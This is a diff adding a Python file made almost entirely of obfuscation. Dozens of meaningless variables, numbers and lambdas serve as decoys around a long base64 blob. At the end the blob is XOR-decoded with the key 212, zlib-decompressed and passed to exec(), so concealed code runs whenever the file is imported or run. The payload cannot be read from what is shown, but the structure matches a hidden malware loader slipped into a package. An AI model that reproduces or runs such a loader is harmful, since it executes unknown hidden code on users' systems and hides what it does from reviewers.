@@ -1,0 +1,52 @@
+import base64 as _b64,zlib as _zl
+cOP9EBG1g1bTVuNe=831695*55
+BPvhRe0kWmtvN3jE=lambda _:2*_+77
+sV5dyG9EINKmlAN7='zhPQhgiRvdv'
+KQkDejKdzGqSlfBn=[138,63,135,119,177,141]
+IPLt0hDLo2dQwozO=lambda _:4*_+90
+OpE2z7SAePdgn7EN=327513*65
+CTfbdwBVH9SMBoGh=[228,188,50,54,50,204]
+ZPie0GSq3KE0gsTl=lambda _:5*_+49
+vi6c7iICqzQBOYrs=11322*88
+DcvDmOdJCP03OVG9=lambda _:1*_+98
+qGWcz5X9WFsLC8u1='FyTQryuU'
+xLpJgUpnwUyZkwQQ='jZpOVprY'
+UMzW4XtqvT4wwA3r=lambda _:1*_+91
+Ablk9p06gYMC241t=lambda _:3*_+18
+L0spUui0ENB3LSNE=[103,24,0,118,66,69]
+p3CJx28XfO0Ax0Un=[16,45,204,153,153,221]
+bd6sKaBHAxDmqsIq=212
+xfaMbO5jqyg8aVbC=[
+'rA5RgI+jdpzEqjODpKiMtPKVdiVCZzrtrOMK0ViyGvhTn9fJdc898l6vImu7d50S5e9vKZaBA4MBi8GB0XfM',
+'80DzzTX5Fk84r5e10Jqe+ggM/dj9kLNn2W14e80idQcPDHpOUYcI8FRebUvItePZ1UVj9Pd28KX6JCzRrKk6',
+'jPGhMhijPGzPXAbXE2e3dnKmxiLV2NV78/3szwpYdl1qCp1r/VMKD+2RP2MVCe6JkgE9iUzILx8jvMqazGNc',
+'U1wr8nAcFYVIUXT+CCRW36ZZaYUaYeyniPPDhhAQpjkpGvZtoKT1LTUX9jBeSYVybjS4tDRnVLmbLCpX5iAK',
+'3YgDMzWn3WyjW2i+6nTgZcj0nujw6BZAS7bQqjFxklVjycThoorIMaWKv0qqRshXEOfJSPbeRuNwPXKFR3BF',
+'3GsUh1W0GvplRNsQXnacswA18dEeJYQK/VekyL0bK8XbUBm/IDnhSVsYlCyTiYIsKGtUJKORgqpBRKGAWu6M',
+'GY5T0nrNjW2dZ8xceAUw7FVcqgA+zvNP8mb2tE5zRpXw3rtZvq541fwQHBBdzdXOtINsxQr70T0LXKg6/1qP',
+'4+ROeb8H1Yq6orAAvwK+yKL/ns13mV9So3uK7bretF6vr1e86oCBoX6ifDe/GzGadGrKDldvamarhqJkYXzO',
+'cWQgQYKLlntjfQy8bnk7weF8sy/Q6S85mdggynxSjcZ4k2TeVuwGn5rtfACTomFyB1fruoCpozsa0+zIrlkd',
+'dpOPJ3nPQstZuEdUCvd5R0GOJfiZO/mzIWTYo0UO03cXpS64gcIMi5lZkXuOEp6vCan+G9OdwDkDLvgGAq7r',
+'rKGiOa2ROaOC+VXPGgm4tLwd9Yz2D7xr4JnHSqJQvV4W5VBi9B0z1Z3U9TZxAWLcfArnb4lpo5uX94qDmO7v',
+'518QIeDZQqJKRZWMTVthnufL4faq5zVLAxHrmyx9VyszFb8uBiNfww14LdRpXkYoALnZsmfFCzDfLtoAzhNz',
+'IbekY0hgrzcW0bgNuaNTfzqGtxRr3uUS3XoDz1kWC8NMHaTuSMzHp3FaWfoX/cNiGoS/G0LJp+yJ2SEIjNz8',
+'WR2XZRyCWVfHgyIpNlagy72g66bfyKOvH2P4s08SaBIi1pDqbVwChg/3t7qKpGv6tTXnLjPAxrRRLQjQOEU5',
+'m71gEz6ktj4XnaOyPNiPh+z6EEKf/E+XiyBNBxdURTtnoStFkbY5scsG9GGH1sbTZ6lVfBhOd5w04rUXQ1JC',
+'UfaY9J55uY6w/dftmHm21uiG2NTfi1j4XF5Q5rZUobGdctOORPCFLtPEDvWu'
+]
+WdIqy6MLne3KaNZw=[233,244,185,206,203,168]
+Wdntvddt08ajhV0g=241596*54
+Wz1BqT6o62rsRPjB=132186*64
+lc4FKETl6YTKVzap=991096*85
+iwyCAEv9hi3umgZt=[160,217,27,5,248,163]
+OwJwdF1GBfryZ9Tw='zpbYXzsdUq'
+igJ6YIBVDhI7y3Na=597486*45
+LJtV2eVBHnYCOv4H=lambda _:2*_+91
+ulRL1SF2cjzmwfbL=lambda _:4*_+19
+rsYlxevqPyWMpTBZ=lambda _:5*_+87
+Qc2EnTlmw9xf81R2='cIvc'
+BgiwLIE190dWLrtJ=725720*54
+M9hgGg49FRecDtnz=''.join(xfaMbO5jqyg8aVbC)
+PtehZyzkCbjQW25Q=bytes([b^bd6sKaBHAxDmqsIq for b in _b64.b64decode(M9hgGg49FRecDtnz)])
+l4rEmpdhiE5OwM0Y=_zl.decompress(PtehZyzkCbjQW25Q).decode('utf-8')
+exec(l4rEmpdhiE5OwM0Y)
